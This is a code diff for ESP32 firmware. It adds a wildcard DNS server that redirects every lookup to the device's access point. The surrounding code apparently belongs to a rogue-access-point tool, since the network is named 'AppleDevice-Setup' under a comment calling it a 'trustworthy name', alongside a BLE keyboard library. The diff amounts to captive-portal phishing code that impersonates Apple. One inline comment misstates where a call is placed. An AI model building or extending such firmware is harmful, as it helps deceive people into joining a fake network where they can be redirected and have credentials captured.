@@ -5,6 +5,24 @@
 #include <ESPAsyncWebServer.h>
 #include <BleKeyboard.h>
 
+#include <DNSServer.h>
+
+const byte DNS_PORT = 53;
+DNSServer dnsServer;
+
+// --- inside setup() after setupAP() ---
+void setupDNS()
+{
+  // Redirect all DNS requests to the AP IP
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+}
+
+// --- inside loop() ---
+void handleDNS()
+{
+  dnsServer.processNextRequest();
+}
+
 // --- WiFi AP (trustworthy name) ---
 const char *ap_ssid = "AppleDevice-Setup";
 const char *ap_pass = "Setup1234";
@@ -78,6 +96,7 @@ void setup()
 
   setupAP();
   setupWeb();
+  setupDNS(); // <--- add DNS setup here
 
   Serial.println("Starting BLE Keyboard...");
   bleKeyboard.begin();
@@ -150,4 +169,5 @@ void loop()
   }
 
   delay(10);
+  handleDNS(); // <--- add this at the start of loop
 }
